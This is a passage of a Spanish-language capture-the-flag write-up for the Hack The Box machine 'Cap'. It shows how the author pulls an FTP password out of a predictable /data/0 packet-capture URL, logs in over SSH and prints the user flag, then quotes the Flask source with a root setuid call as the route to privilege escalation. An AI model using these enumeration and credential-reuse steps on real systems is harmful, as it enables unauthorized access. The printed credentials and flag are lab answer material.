&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;      539l     2846w    38910c http://10.10.10.245/netstat
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;pcap-passwords&#34;&gt;PCAP Passwords&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;Security Snapshot&lt;/code&gt; permite analizar y descargar una captura de trafico a traves de un archivo pcap, tras analizar el archivo (&lt;code&gt;1.pcap&lt;/code&gt;) encontramos las solicitudes (de feroxbuster) que realizamos a la maquina, aunque no se muestra ningun tipo de servicio y/o puerto visitado recientemente.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/cap/Screenshot_20210605_134504.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Notamos que el nombre del archivo se incrementa (&lt;code&gt;1.pcap&lt;/code&gt;) asi como la direccion (&lt;code&gt;/data/1&lt;/code&gt;) al visitar y/o descargar el snapshot de 5 segundos, por lo que verificamos si existia algun snapshot anterior, visitamos &lt;code&gt;/data/0&lt;/code&gt; y encontramos que existe dicho archivo, tras analizarlo encontramos credenciales en el servicio FTP.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;nathan:Buck3tH4TF0RM3!
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/cap/Screenshot_20210605_134828.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;user---nathan&#34;&gt;User - Nathan&lt;/h1&gt;
&lt;p&gt;Utilizamos las credenciales en el servicio SSH, obtuvimos una shell y la flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;π ~/htb/cap ❯ ssh nathan@10.10.10.245
The authenticity of host &lt;span class=&#34;s1&#34;&gt;&amp;#39;10.10.10.245 (10.10.10.245)&amp;#39;&lt;/span&gt; can&lt;span class=&#34;s1&#34;&gt;&amp;#39;t be established.
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;ECDSA key fingerprint is SHA256:8TaASv/TRhdOSeq3woLxOcKrIOtDhrZJVrrE0WbzjSc.
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Warning: Permanently added &amp;#39;&lt;/span&gt;10.10.10.245&lt;span class=&#34;s1&#34;&gt;&amp;#39; (ECDSA) to the list of known hosts.
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;nathan@10.10.10.245&amp;#39;&lt;/span&gt;s password:
Welcome to Ubuntu 20.04.2 LTS &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;GNU/Linux 5.4.0-73-generic x86_64&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Jun  &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; 19:27:25 UTC &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;

  System load:           0.03
  Usage of /:            34.9% of 8.73GB
  Memory usage:          21%
  Swap usage:            0%
  Processes:             &lt;span class=&#34;m&#34;&gt;228&lt;/span&gt;
  Users logged in:       &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
  IPv4 address &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; eth0: 10.10.10.245
  IPv6 address &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; eth0: dead:beef::250:56ff:feb9:d439

  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; There are &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; zombie processes.

Last login: Thu May &lt;span class=&#34;m&#34;&gt;27&lt;/span&gt; 11:21:27 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; from 10.10.14.7
nathan@cap:~$ ls
user.txt
nathan@cap:~$ cat user.txt
dd1183750d1f8fc9ba833fbb6dc70da7
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h1&gt;
&lt;p&gt;Vemos en el codigo fuente un comentario que indica que existen algunos problemas de permisos con gunicorn, vemos que se utiliza python por ello, pero notamos que utiliza &lt;code&gt;os.setuid(0)&lt;/code&gt;, lo que indica que cada vez que realiza un snapshot lo hace con el usuario root.&lt;/p&gt;

&lt;div id=&#34;b524fd8b4c4dcead&#34; class=&#34;codetab&#34;&gt;
  &lt;div class=&#34;codetab__links&#34;&gt;
    
      &lt;button class=&#34;codetab__link&#34; aria-label=&#34;Tab link&#34;&gt;python&lt;/button&gt;
    
      &lt;button class=&#34;codetab__link&#34; aria-label=&#34;Tab link&#34;&gt;python&lt;/button&gt;
    
  &lt;/div&gt;
  
  
&lt;div id=&#34;18d6b7775b56b7f9&#34; class=&#34;codetab__content&#34;&gt;
  &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;nd&#34;&gt;@app&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;route&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/capture&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;nd&#34;&gt;@limiter&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;limit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;10 per minute&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;capture&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;

      &lt;span class=&#34;n&#34;&gt;get_lock&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;pcapid&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;get_appid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;increment_appid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;release_lock&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;

      &lt;span class=&#34;n&#34;&gt;path&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;join&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;app&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;root_path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;upload&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pcapid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;.pcap&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;ip&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;remote_addr&lt;/span&gt;
      &lt;span class=&#34;c1&#34;&gt;# permissions issues with gunicorn and threads. hacky solution for now.&lt;/span&gt;
      &lt;span class=&#34;c1&#34;&gt;#os.setuid(0)&lt;/span&gt;
      &lt;span class=&#34;c1&#34;&gt;#command = f&amp;#34;timeout 5 tcpdump -w {path} -i any host {ip}&amp;#34;&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;command&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&amp;#34;python3 -c &amp;#39;import os; os.setuid(0); os.system(&amp;#34;timeout 5 tcpdump -w &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; -i any host &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ip&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;)&amp;#39;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
      &lt;span class=&#34;c1&#34;&gt;#os.setuid(1000)&lt;/span&gt;

      &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;redirect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/data/&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pcapid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
  
&lt;div id=&#34;e824d636cfae0088&#34; class=&#34;codetab__content&#34;&gt;
  &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;  1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 70
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 71
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 72
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 73
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 74
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 75
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 76
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 77
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 78
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 79
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 80
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 81
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 82
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 83
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 84
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 85
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 86
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 87
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 88
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 89
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 90
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 91
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 92
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 93
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 94
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 95
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 96
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 97
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 98
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 99
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;100
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;101
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;102
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;103
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;104
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;105
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;106
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;107
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;108
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;109
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;110
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;111
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;112
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;113
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;114
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;115
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;116
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;117
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;118
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;119
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;120
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;121
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;122
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;123
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;124
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;125
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;126
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;127
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;128
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;129
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;130
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;131
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;132
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;133
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;134
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;135
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;136
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;137
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;138
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;139
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;140
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;141
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;142
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;143
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;144
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;145
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;146
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;147
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;148
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;149
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;150
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;151
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;152
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;153
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;154
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;155
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;ch&#34;&gt;#!/usr/bin/python3&lt;/span&gt;

&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;os&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;flask&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;flask_limiter&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Limiter&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;flask_limiter.util&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;get_remote_address&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;tempfile&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;dpkt&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;werkzeug.utils&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;append_slash_redirect&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;app&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Flask&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;vm&#34;&gt;__name__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
